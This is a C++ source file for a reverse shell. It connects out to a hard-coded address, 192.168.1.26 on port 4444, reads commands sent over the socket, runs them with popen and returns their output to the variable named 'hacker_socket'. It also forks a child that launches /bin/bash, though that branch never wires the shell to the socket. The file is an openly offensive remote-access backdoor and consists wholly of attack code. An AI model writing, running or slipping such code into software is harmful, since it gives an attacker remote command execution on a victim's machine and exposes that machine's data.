#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <cstring>


class Socket {
public:
    Socket(const char* host, int port)
        : host_(host), port_(port) {}

    bool createSocket() {
        socketfd_ = socket(AF_INET, SOCK_STREAM, 0);
        if (socketfd_ < 0) {
            perror("Error when creating a socket");
            return false;
        }
        return true;
    }

    bool connectToServer() {
        struct sockaddr_in servaddr = {0};
        servaddr.sin_family = AF_INET;
        servaddr.sin_port = htons(port_);
        inet_pton(AF_INET, host_, &servaddr.sin_addr);

        if (connect(socketfd_, (struct sockaddr*)&servaddr, sizeof(servaddr)) < 0) {
            perror("Error when establishing a connection with a socket");
            return false;
        }
        return true;
    }

    int getSocketfd() const {
        return socketfd_;
    }

    void closeSocket() {
        close(socketfd_);
    }

private:
    const char* host_;
    int port_;
    int socketfd_;
};
class ChildProcess {
public:
    ChildProcess(int socketfd) : socketfd_(socketfd) {}

    bool runShell() {
        char hostname[1024];
        gethostname(hostname, 1024);

        struct sockaddr_in addr;
        socklen_t addr_size = sizeof(struct sockaddr_in);
        getsockname(socketfd_, (struct sockaddr *)&addr, &addr_size);
        int port = ntohs(addr.sin_port);

        const char* args[] = {"/bin/bash", NULL};
        execve(args[0], (char* const*)args, NULL);

        perror("Shell startup error");
        return false;
    }

private:
    int socketfd_;
};


class ParentProcess {
public:
    ParentProcess(int socketfd) : socketfd_(socketfd) {}

   void handleCommands(int hacker_socket) {
      char buffer[1024] = {0};
      int n = 0;
      while ((n = read(socketfd_, buffer, sizeof(buffer))) > 0) {
        buffer[n - 1] = '\0';
        FILE* fp = popen(buffer, "r");
        if (fp == NULL) {
            perror("Error when executing the command");
        } else {
            char result[1024] = {0};
            while (fgets(result, sizeof(result)-1, fp) != NULL) {
                send(hacker_socket, result, strlen(result), 0);
            }
            pclose(fp);
        }
        send(hacker_socket, "$ ", 2, 0);
      }
   }


private:
    int socketfd_;
};

int main(int argc, char** argv) {
    const char* host = "192.168.1.26";
    int port = 4444;
    Socket socket(host, port);
    if (!socket.createSocket() || !socket.connectToServer()) {
        return 1;
    }

    pid_t pid = fork();
    if (pid == -1) {
        perror("Error when creating a child process");
        return 1;
    } else if (pid == 0) {
        ChildProcess child(socket.getSocketfd());
        child.runShell();
    } else {
        ParentProcess parent(socket.getSocketfd());
        parent.handleCommands(socket.getSocketfd());
    }

    return 0;
}
